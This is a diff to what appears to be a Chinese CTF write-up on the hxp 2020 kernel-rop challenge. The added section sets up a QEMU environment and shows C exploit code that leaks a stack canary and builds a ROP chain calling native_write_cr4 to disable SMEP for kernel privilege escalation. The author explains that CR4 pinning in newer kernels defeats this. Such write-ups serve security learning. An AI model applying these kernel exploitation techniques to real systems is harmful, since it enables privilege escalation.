@@ -11,6 +11,7 @@ comments: true
 - [4. canary：ret2usr](#4-canaryret2usr)
 - [5. canary+smep：ROP](#5-canarysmeprop)
   - [5.1 smep的原理](#51-smep的原理)
+  - [5.2 ROP + native\_write\_cr4(已失效)](#52-rop--native_write_cr4已失效)
 
 
 # 例题: hxp 2020 kernel-rop<br>
@@ -267,7 +268,74 @@ ffffffff814443e0 T native_write_cr4
 而cr4寄存器的具体值，其实可以通过`kernel panic`或者gdb调试给出。（一般情况下该值不会发生变化）<br>
 ![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260824235043.png)
 
+启动命令：<br>
+```
+#!/bin/sh
+qemu-system-x86_64 \
+    -m 128M \
+    -cpu kvm64,+smep,-smap \
+    -kernel bzImage \
+    -initrd initramfs.cpio.gz \
+    -snapshot \
+    -nographic \
+    -monitor /dev/null \
+    -no-reboot \
+    -append "console=ttyS0 nokaslr nopti quiet panic=1" \
+    -s
+```
 
+## 5.2 ROP + native_write_cr4(已失效)<br>
+第一个尝试的绕过方法是 rop调用`native_write_cr4`函数，改cr4寄存器的值。<br>
+主要差异体现在如下代码:<br>
+```c
+int main(){
+    // step 0 : save status
+    save_status();
+
+    int fd =open_device();
+    // step 1: leak the canary
+    unsigned long tmp_buf[30];
+    unsigned long size=0x10*10;
+    read(fd,tmp_buf,size);
+    unsigned long canary = tmp_buf[16];
+    printf("canary: 0x%llx\n",canary);
+
+    // step 2: construct the payload
+    tmp_buf[17] = 0;
+    tmp_buf[18] = 0;
+    tmp_buf[19] = 0;
+    tmp_buf[20] = pop_rdi_ret;
+    tmp_buf[21] = 0x6f0;
+    tmp_buf[22] = native_write_cr4_addr;
+    tmp_buf[23] = (unsigned long )escalate_privs;
+    write(fd,tmp_buf,size+8*4);
+
+}
+```
+实际执行时发现不可用:<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260825230032.png)
+问了一下chatgpt，发现`linux 5.3`版本添加了`CR4 bits pinning`机制：<br>
+```c
+void native_write_cr4(unsigned long val)
+{
+	unsigned long bits_changed = 0;
+
+set_register:
+	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");
+
+	if (static_branch_likely(&cr_pinning)) { // 判断是否启动了cr4 pinning机制
+		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
+			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
+			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
+			goto set_register;
+		}
+		/* Warn after we've corrected the changed bits. */
+		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
+			  bits_changed);
+	}
+}
+```
+所以直接调用`native_write_cr4`的方法已经失效了。<br>
 
 
 
